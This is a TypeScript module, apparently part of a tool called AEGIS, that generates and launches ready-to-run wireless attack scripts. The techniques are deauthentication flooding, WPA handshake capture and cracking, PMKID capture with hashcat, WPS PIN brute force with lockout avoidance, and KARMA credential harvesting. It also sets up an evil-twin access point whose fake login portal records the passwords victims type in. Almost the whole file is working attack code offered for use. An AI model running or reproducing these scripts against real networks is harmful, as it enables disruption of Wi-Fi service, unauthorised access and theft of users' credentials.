import { spawn, ChildProcess, execSync } from "child_process";
import { randomBytes } from "crypto";
import * as fs from "fs";
import * as path from "path";

// ─── Types ────────────────────────────────────────────────────────────────────

export type WirelessTechnique =
  | "handshake"
  | "deauth"
  | "evil-twin"
  | "pmkid"
  | "wps-pin"
  | "karma"
  | "scan";

export interface WirelessConfig {
  technique: WirelessTechnique;
  iface: string;
  bssid?: string;
  ssid?: string;
  channel?: string;
  clientMac?: string;
  wordlist?: string;
  duration?: number;
}

export interface WirelessJob {
  id: string;
  config: WirelessConfig;
  startTime: number;
  active: boolean;
  exitCode: number | null;
  signal: string | null;
  output: string[];       // merged stdout + stderr lines
  scriptPath: string;
  process: ChildProcess | null;
}

export interface ToolStatus {
  name: string;
  available: boolean;
  path?: string;
}

// ─── State ───────────────────────────────────────────────────────────────────

const jobs = new Map<string, WirelessJob>();

function makeId() { return randomBytes(8).toString("hex"); }

// ─── Tool detection ──────────────────────────────────────────────────────────

const REQUIRED_TOOLS: Record<WirelessTechnique | "base", string[]> = {
  base:       ["bash"],
  scan:       ["airodump-ng", "airmon-ng"],
  handshake:  ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
  deauth:     ["airmon-ng", "aireplay-ng"],
  "evil-twin":["airmon-ng", "hostapd", "dnsmasq", "python3", "aireplay-ng"],
  pmkid:      ["airmon-ng", "hcxdumptool", "hcxpcapngtool", "hashcat"],
  "wps-pin":  ["airmon-ng", "reaver"],
  karma:      ["airmon-ng", "hostapd-wpe"],
};

export function checkTools(technique: WirelessTechnique): ToolStatus[] {
  const needed = [...(REQUIRED_TOOLS.base ?? []), ...(REQUIRED_TOOLS[technique] ?? [])];
  const unique = [...new Set(needed)];
  return unique.map((tool) => {
    try {
      const p = execSync(`which ${tool} 2>/dev/null`, { timeout: 2000 }).toString().trim();
      return { name: tool, available: p.length > 0, path: p || undefined };
    } catch {
      return { name: tool, available: false };
    }
  });
}

export function checkAllTools(): ToolStatus[] {
  const allTools = [...new Set(Object.values(REQUIRED_TOOLS).flat())];
  return allTools.map((tool) => {
    try {
      const p = execSync(`which ${tool} 2>/dev/null`, { timeout: 2000 }).toString().trim();
      return { name: tool, available: p.length > 0, path: p || undefined };
    } catch {
      return { name: tool, available: false };
    }
  });
}

// ─── Script builder ──────────────────────────────────────────────────────────

function buildScript(cfg: WirelessConfig): string {
  const iface = cfg.iface || "wlan0";
  const bssid = cfg.bssid || "AA:BB:CC:DD:EE:FF";
  const ssid = cfg.ssid || "TargetNetwork";
  const channel = cfg.channel || "6";
  const client = cfg.clientMac || "FF:FF:FF:FF:FF:FF";
  const wordlist = cfg.wordlist || "/usr/share/wordlists/rockyou.txt";
  const duration = cfg.duration || 30;
  const mon = `${iface}mon`;

  if (cfg.technique === "scan") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] Starting wireless scan on ${iface} (channel ${channel || "all"})"
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
echo "[AEGIS] Monitor interface: ${mon}"
${channel ? `iwconfig ${mon} channel ${channel} 2>&1 || true` : ""}
echo "[AEGIS] Scanning for networks (${duration}s)..."
timeout ${duration} airodump-ng ${channel ? `-c ${channel}` : ""} --output-format csv -w /tmp/aegis_scan ${mon} 2>&1 || true
echo "[AEGIS] Parsing results..."
if [ -f /tmp/aegis_scan-01.csv ]; then
  echo "=== DISCOVERED NETWORKS ==="
  cat /tmp/aegis_scan-01.csv | head -100
  rm -f /tmp/aegis_scan-01.csv /tmp/aegis_scan-01.kismet.csv 2>/dev/null || true
fi
airmon-ng stop ${mon} 2>&1 || true
echo "[AEGIS] Scan complete"
`;

  if (cfg.technique === "handshake") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] WPA Handshake Capture | Target: ${bssid} | SSID: ${ssid}"
CAPFILE="/tmp/aegis_hs_$(date +%s)"
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
echo "[AEGIS] Monitor interface: ${mon} | Channel: ${channel}"
airodump-ng -c ${channel} --bssid ${bssid} -w "$CAPFILE" ${mon} &
DUMP_PID=$!
echo "[AEGIS] Capturing on channel ${channel} — waiting 5s then sending deauth..."
sleep 5
echo "[AEGIS] Sending deauth frames to ${client} @ ${bssid}..."
aireplay-ng --deauth 20 -a ${bssid} -c ${client} ${mon} 2>&1 || true
echo "[AEGIS] Waiting for 4-way handshake..."
sleep 8
kill $DUMP_PID 2>/dev/null || true
echo "[AEGIS] Checking for handshake in capture..."
aircrack-ng "$CAPFILE"-01.cap 2>&1 | grep -A2 "handshake\\|WPA\\|BSSID" || echo "[AEGIS] No handshake yet — try again closer to AP or when client is active"
echo "[AEGIS] Starting crack with wordlist: ${wordlist}"
aircrack-ng -w ${wordlist} -b ${bssid} "$CAPFILE"-01.cap 2>&1
echo "[AEGIS] Capture file: $CAPFILE-01.cap"
airmon-ng stop ${mon} 2>&1 || true
`;

  if (cfg.technique === "deauth") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] Deauthentication Attack | AP: ${bssid} | Client: ${client} | Ch: ${channel}"
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
echo "[AEGIS] Monitor interface: ${mon}"
iwconfig ${mon} channel ${channel} 2>&1 || true
echo "[AEGIS] Sending continuous deauth frames for ${duration}s..."
echo "[AEGIS] Targeted client: ${client} (FF:FF:FF:FF:FF:FF = broadcast all clients)"
timeout ${duration} aireplay-ng --deauth 0 -a ${bssid} -c ${client} ${mon} 2>&1 || true
echo "[AEGIS] Deauth burst complete"
airmon-ng stop ${mon} 2>&1 || true
echo "[AEGIS] Done"
`;

  if (cfg.technique === "evil-twin") {
    const confDir = "/tmp/aegis_et";
    return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] Evil Twin AP | SSID: ${ssid} | Channel: ${channel} | Mirroring: ${bssid}"
mkdir -p ${confDir}

echo "[AEGIS] Building hostapd config..."
cat > ${confDir}/hostapd.conf << 'CONFEOF'
interface=at0
driver=nl80211
ssid=${ssid}
channel=${channel}
hw_mode=g
ignore_broadcast_ssid=0
CONFEOF

echo "[AEGIS] Building dnsmasq config..."
cat > ${confDir}/dnsmasq.conf << 'CONFEOF'
interface=at0
dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
CONFEOF

echo "[AEGIS] Building captive portal..."
cat > ${confDir}/portal.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging, datetime, urllib.parse

logging.basicConfig(filename='${confDir}/captured.log', level=logging.INFO,
    format='%(asctime)s %(message)s')

class Portal(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'''<html><head><title>Network Login</title>
<style>body{font:14px sans-serif;display:flex;justify-content:center;padding-top:80px}
form{border:1px solid #ccc;padding:24px;width:280px;border-radius:8px}
input{display:block;width:100%;margin:6px 0 14px;padding:8px;box-sizing:border-box}
button{width:100%;padding:8px;background:#0066cc;color:#fff;border:0;border-radius:4px;cursor:pointer}
</style></head><body><form method=POST action=/login>
<b>WiFi Network Login</b><br><br>
<label>Username</label><input name=user>
<label>Password</label><input type=password name=pass>
<button>Connect</button></form></body></html>''')
    def do_POST(self):
        l = int(self.headers.get('Content-Length', 0))
        body = urllib.parse.parse_qs(self.rfile.read(l).decode())
        user = body.get('user', [''])[0]
        pwd  = body.get('pass', [''])[0]
        src  = self.client_address[0]
        logging.info(f"CAPTURED ip={src} user={user!r} pass={pwd!r}")
        print(f"[AEGIS] CREDENTIAL CAPTURED: {src} | user={user!r} | pass={pwd!r}", flush=True)
        self.send_response(302)
        self.send_header('Location', 'http://connectivitycheck.gstatic.com/generate_204')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Portal).serve_forever()
PYEOF

echo "[AEGIS] Starting monitor mode..."
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
iwconfig ${mon} channel ${channel} 2>&1 || true

echo "[AEGIS] Creating virtual interface at0..."
airbase-ng -e "${ssid}" -c ${channel} ${mon} &
AIRBASE_PID=$!
sleep 2

echo "[AEGIS] Configuring at0 interface..."
ifconfig at0 192.168.1.1 netmask 255.255.255.0 up 2>&1 || true
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>&1 || true
echo 1 | tee /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

echo "[AEGIS] Starting DHCP server..."
dnsmasq -C ${confDir}/dnsmasq.conf -d &
DNSMASQ_PID=$!

echo "[AEGIS] Starting captive portal on port 80..."
python3 ${confDir}/portal.py &
PORTAL_PID=$!

echo "[AEGIS] Deauthing clients from real AP ${bssid}..."
aireplay-ng --deauth 0 -a ${bssid} ${mon} &
DEAUTH_PID=$!

echo "[AEGIS] Evil Twin active — running for ${duration}s"
echo "[AEGIS] Captured credentials will appear here in real time"
echo "[AEGIS] Portal log: ${confDir}/captured.log"
sleep ${duration}

echo "[AEGIS] Stopping attack..."
kill $DEAUTH_PID $PORTAL_PID $DNSMASQ_PID $AIRBASE_PID 2>/dev/null || true
airmon-ng stop ${mon} 2>&1 || true
echo ""
echo "=== CAPTURED CREDENTIALS ==="
cat ${confDir}/captured.log 2>/dev/null || echo "No credentials captured"
echo "[AEGIS] Done"
`;
  }

  if (cfg.technique === "pmkid") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] PMKID Attack (clientless WPA2) | Target: ${bssid}"
OUTFILE="/tmp/aegis_pmkid_$(date +%s)"
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
echo "[AEGIS] Monitor interface: ${mon}"
echo "[AEGIS] Capturing PMKID with hcxdumptool (${duration}s)..."
hcxdumptool -i ${mon} -o "$OUTFILE.pcapng" \\
  --enable_status=1 \\
  --filterlist_ap=${bssid} \\
  --filtermode=2 &
HCXPID=$!
sleep ${duration}
kill $HCXPID 2>/dev/null || true

echo "[AEGIS] Converting pcapng to hashcat format..."
hcxpcapngtool -o "$OUTFILE.hash" "$OUTFILE.pcapng" 2>&1 || hcxpcaptool -z "$OUTFILE.hash" "$OUTFILE.pcapng" 2>&1 || true

if [ -s "$OUTFILE.hash" ]; then
  echo "[AEGIS] PMKID hash captured:"
  cat "$OUTFILE.hash"
  echo "[AEGIS] Cracking with hashcat (mode 22000)..."
  hashcat -m 22000 "$OUTFILE.hash" ${wordlist} --force 2>&1
else
  echo "[AEGIS] No PMKID captured — AP may not support PMKID or target not in range"
  echo "[AEGIS] Tip: Try running longer or confirm target BSSID ${bssid} is correct"
fi
airmon-ng stop ${mon} 2>&1 || true
echo "[AEGIS] Done"
`;

  if (cfg.technique === "wps-pin") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] WPS PIN Attack (Pixie Dust + Brute Force) | Target: ${bssid} | Ch: ${channel}"
airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1
echo "[AEGIS] Monitor interface: ${mon}"

echo "[AEGIS] Step 1: Pixie Dust attack (fastest — recovers PIN from WPS exchange)..."
timeout $((${duration}/2)) reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -K 1 -f 2>&1 || true

echo ""
echo "[AEGIS] Step 2: WPS brute force PIN (if Pixie Dust failed)..."
echo "[AEGIS] Note: Some APs have lockout — using -d 3 (3s delay) and -r 3:15 (lockout avoidance)"
timeout $((${duration}/2)) reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -d 3 -r 3:15 2>&1 || true

airmon-ng stop ${mon} 2>&1 || true
echo "[AEGIS] Done"
`;

  if (cfg.technique === "karma") return `#!/bin/bash
set -euo pipefail
echo "[AEGIS] KARMA Attack — responding to all probe requests"
CONFDIR="/tmp/aegis_karma"
mkdir -p $CONFDIR

cat > $CONFDIR/karma.conf << 'CONFEOF'
interface=at0
driver=nl80211
ssid=FreeWifi
channel=6
hw_mode=g
wpe_karma=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
wpe_logfile=$CONFDIR/karma_creds.log
CONFEOF

airmon-ng check kill 2>&1 || true
airmon-ng start ${iface} 2>&1

echo "[AEGIS] Creating at0 virtual interface..."
airbase-ng -P -C 30 -e "FreeWifi" ${mon} &
AIRBASE_PID=$!
sleep 2

ifconfig at0 10.0.0.1 netmask 255.0.0.0 up 2>&1 || true

echo "[AEGIS] Starting hostapd-wpe with KARMA..."
hostapd-wpe $CONFDIR/karma.conf &
HOSTAPD_PID=$!

echo "[AEGIS] KARMA active — responding to all probe requests for ${duration}s"
echo "[AEGIS] Capturing EAP credentials to $CONFDIR/karma_creds.log"

# Tail the log in real time
tail -f $CONFDIR/karma_creds.log &
TAIL_PID=$!
sleep ${duration}

echo "[AEGIS] Stopping KARMA..."
kill $TAIL_PID $HOSTAPD_PID $AIRBASE_PID 2>/dev/null || true
airmon-ng stop ${mon} 2>&1 || true
echo ""
echo "=== KARMA RESULTS ==="
cat $CONFDIR/karma_creds.log 2>/dev/null || echo "No credentials captured"
echo "[AEGIS] Done"
`;

  return `#!/bin/bash\necho "[AEGIS] Unknown technique: ${cfg.technique}"\n`;
}

// ─── Job runner ──────────────────────────────────────────────────────────────

function isToolAvailable(tool: string): boolean {
  try {
    const p = execSync(`which ${tool} 2>/dev/null`, { timeout: 2000 }).toString().trim();
    return p.length > 0;
  } catch { return false; }
}

export function startWirelessAttack(cfg: WirelessConfig): WirelessJob {
  const id = makeId();
  const scriptPath = `/tmp/aegis_wireless_${id}.sh`;

  const job: WirelessJob = {
    id, config: cfg, startTime: Date.now(),
    active: true, exitCode: null, signal: null,
    output: [], scriptPath, process: null,
  };
  jobs.set(id, job);

  const ts = () => new Date().toTimeString().slice(0, 8);
  const prefix = `[AEGIS][${new Date().toISOString()}] `;
  job.output.push(`${prefix}Launching: ${cfg.technique.toUpperCase()} on ${cfg.iface}`);
  job.output.push(`${prefix}Target: ${cfg.bssid || "N/A"} SSID: ${cfg.ssid || "N/A"} Channel: ${cfg.channel || "auto"}`);
  job.output.push(`${"─".repeat(60)}`);

  // Pre-flight: verify core tools are present before spawning any script
  const coreTools = REQUIRED_TOOLS[cfg.technique] ?? [];
  const missing = coreTools.filter(t => !isToolAvailable(t));
  if (missing.length > 0) {
    job.active = false;
    job.exitCode = 127;
    job.output.push(`[${ts()}] TOOL NOT FOUND: ${missing.join(", ")}`);
    job.output.push(`[${ts()}] ──────────────────────────────────────────────────────`);
    job.output.push(`[${ts()}] Wireless attack tools are not available in this environment.`);
    job.output.push(`[${ts()}] These tools require a native Linux system with:`);
    job.output.push(`[${ts()}]   • A monitor-mode capable wireless adapter (e.g. Alfa AWUS036ACH)`);
    job.output.push(`[${ts()}]   • Kali Linux or Parrot OS with aircrack-ng suite installed`);
    job.output.push(`[${ts()}]   • Root/sudo access to configure monitor mode`);
    job.output.push(`[${ts()}] `);
    job.output.push(`[${ts()}] To install on Kali/Parrot:`);
    job.output.push(`[${ts()}]   sudo apt-get install -y aircrack-ng hcxtools hashcat reaver hostapd-wpe`);
    job.output.push(`[${ts()}] `);
    job.output.push(`[${ts()}] Missing: ${missing.join("  ")}`);
    job.output.push(`${"─".repeat(60)}`);
    return job;
  }

  const script = buildScript(cfg);
  fs.writeFileSync(scriptPath, script, { mode: 0o755 });
  job.output.push(`${prefix}Script written to: ${scriptPath}`);

  const proc = spawn("bash", [scriptPath], {
    env: { ...process.env, TERM: "dumb" },
    stdio: ["ignore", "pipe", "pipe"],
  });

  job.process = proc;

  const addLine = (src: "out" | "err", raw: string) => {
    for (const line of raw.split("\n")) {
      const trimmed = line.trimEnd();
      if (!trimmed) continue;
      const ts = new Date().toTimeString().slice(0, 8);
      const prefix = src === "err" ? `[${ts}][STDERR] ` : `[${ts}] `;
      const logLine = prefix + trimmed;
      job.output.push(logLine);
      if (job.output.length > 5000) job.output.splice(0, job.output.length - 4000);
    }
  };

  proc.stdout?.on("data", (d: Buffer) => addLine("out", d.toString()));
  proc.stderr?.on("data", (d: Buffer) => addLine("err", d.toString()));

  proc.on("close", (code, signal) => {
    job.active = false;
    job.exitCode = code;
    job.signal = signal;
    const ts = new Date().toTimeString().slice(0, 8);
    job.output.push(`${"─".repeat(60)}`);
    job.output.push(`[${ts}] Process exited — code: ${code ?? "?"} signal: ${signal ?? "none"}`);
    if (code === 0) job.output.push(`[${ts}] Attack completed successfully`);
    else if (code === 127) job.output.push(`[${ts}] TOOL NOT FOUND — Install required tools: see tool availability panel`);
    else if (code !== null && code > 0) job.output.push(`[${ts}] Attack terminated (exit code ${code})`);
    try { fs.unlinkSync(scriptPath); } catch {}
  });

  proc.on("error", (err) => {
    job.active = false;
    job.output.push(`[ERROR] Failed to spawn process: ${err.message}`);
  });

  // Auto-kill after duration + 60s grace
  const maxMs = ((cfg.duration ?? 60) + 60) * 1000;
  setTimeout(() => { if (job.active) stopWirelessAttack(id); }, maxMs);

  return job;
}

export function stopWirelessAttack(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  if (job.process && job.active) {
    try { job.process.kill("SIGTERM"); } catch {}
    setTimeout(() => {
      try { if (job.active && job.process) job.process.kill("SIGKILL"); } catch {}
    }, 3000);
  }
  job.active = false;
  return true;
}

export function getWirelessJob(id: string): WirelessJob | undefined {
  return jobs.get(id);
}

export function listWirelessJobs(): { id: string; technique: string; active: boolean; startTime: number; elapsed: number }[] {
  return [...jobs.entries()].map(([id, j]) => ({
    id, technique: j.config.technique, active: j.active,
    startTime: j.startTime, elapsed: Math.floor((Date.now() - j.startTime) / 1000),
  }));
}
